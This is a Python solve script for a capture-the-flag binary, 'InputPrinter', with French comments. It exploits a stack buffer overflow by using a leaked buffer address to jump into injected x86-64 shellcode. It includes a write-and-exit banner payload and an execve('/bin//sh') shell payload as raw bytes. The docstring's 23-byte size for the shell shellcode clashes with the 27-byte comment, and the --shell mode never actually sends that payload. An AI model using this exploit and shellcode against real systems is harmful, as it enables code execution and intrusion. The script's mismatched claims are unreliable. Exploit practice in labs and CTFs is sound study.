#!/usr/bin/env python3
"""InputPrinter (khaledddd) -- stack buffer overflow + shellcode (ret2shellcode).

vuln():
    char buf[64];                 // rbp-0x40, pas de canary (-fno-stack-protector)
    printf("%p\n", buf);          // FUITE : adresse de buf sur la pile
    read(0, buf, 0xff);           // overflow : jusqu'a 255 octets dans un buffer de 64
    printf("you wrote: %s", buf);

Le segment GNU_STACK du binaire est RWE (pas de NX) et l'executable est non-PIE
(type EXEC) : la pile est executable et les adresses du binaire sont fixes.
Il suffit donc de :
  1) lire l'adresse de buf que le programme affiche lui-meme avant le read() ;
  2) ecrire shellcode + bourrage jusqu'a l'adresse de retour (offset 64+8=72
     : buffer puis rbp sauvegarde) ;
  3) ecraser l'adresse de retour avec l'adresse (fuitee) de buf -> `leave;ret`
     saute dans le shellcode qu'on vient d'ecrire.

Deux charges utiles :
  - "banner" (defaut, utilisee par --check) : write(1,"PWNED!\n",7)+exit(0) --
    preuve deterministe et portable de detournement du flot d'execution,
    sans dependre d'un execve() qu'un sandbox (seccomp, conteneur CI, etc.)
    peut filtrer.
  - "shell"  (--shell) : execve("/bin/sh", NULL, NULL), shellcode classique
    23 octets -- la solution "reelle" du challenge, pour un shell interactif
    sur une machine sans filtrage syscall.

Usage :
  inputprinter-solve.py [--bin BINAIRE] --check         # preuve automatique (banniere)
  inputprinter-solve.py [--bin BINAIRE] --shell         # shell interactif (stdin/stdout herites)
"""
import argparse
import re
import subprocess
import sys

OFFSET = 0x40 + 8  # buf (64) + saved rbp (8) avant l'adresse de retour

# write(1, "PWNED!\n", 7) ; exit(0) -- pattern jmp/call/pop pour recuperer
# l'adresse du message sans la coder en dur.
SC_BANNER = bytes.fromhex(
    "eb195e31ffffc731d2b207b8010000000f05b83c00000031ff0f05e8e2ffffff"
    + b"PWNED!\n".hex()
)

# execve("/bin//sh", NULL, NULL) -- shellcode x86-64 classique, 27 octets.
SC_SHELL = (
    b"\x48\x31\xf6"                                   # xor rsi, rsi
    b"\x56"                                           # push rsi
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"        # movabs rdi, "/bin//sh"
    b"\x57"                                           # push rdi
    b"\x48\x89\xe7"                                   # mov rdi, rsp
    b"\x56"                                           # push rsi
    b"\x57"                                           # push rdi
    b"\x48\x89\xe6"                                   # mov rsi, rsp
    b"\xb0\x3b"                                       # mov al, 0x3b (execve)
    b"\x0f\x05"                                       # syscall
)


def build_payload(leak_addr: int, shellcode: bytes) -> bytes:
    pad = b"A" * (OFFSET - len(shellcode))
    return shellcode + pad + leak_addr.to_bytes(8, "little")


def leak_buf_addr(p) -> int:
    first = p.stdout.readline()
    m = re.search(rb"0x[0-9a-fA-F]+", first)
    if not m:
        print("pas de fuite trouvee:", first, file=sys.stderr)
        sys.exit(1)
    return int(m.group(0), 16)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--bin", default="original/vuln")
    ap.add_argument("--check", action="store_true",
                     help="exploite avec le shellcode 'banner' (write+exit), verifie PWNED!")
    ap.add_argument("--shell", action="store_true",
                     help="exploite avec execve(/bin/sh) et donne la main au shell (interactif)")
    a = ap.parse_args()

    if a.shell:
        p = subprocess.Popen([a.bin])
        leak = None
        # on ne peut pas lire la ligne ici (stdout herite du terminal) ;
        # relancer avec --check d'abord si besoin de connaitre l'adresse.
        print("mode --shell : lance le binaire directement, tape a l'aveugle apres la fuite affichee.",
              file=sys.stderr)
        p.wait()
        return

    p = subprocess.Popen([a.bin], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, bufsize=0)
    leak = leak_buf_addr(p)
    print(f"fuite buf = {hex(leak)}")
    payload = build_payload(leak, SC_BANNER)
    p.stdin.write(payload)
    p.stdin.flush()
    try:
        out = p.stdout.read(4096)
    except Exception:
        out = b""
    p.wait(timeout=2)
    print(out.decode(errors="replace"))
    ok = b"PWNED!" in out
    print("RIP detourne avec succes (banniere recue)" if ok else "echec")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
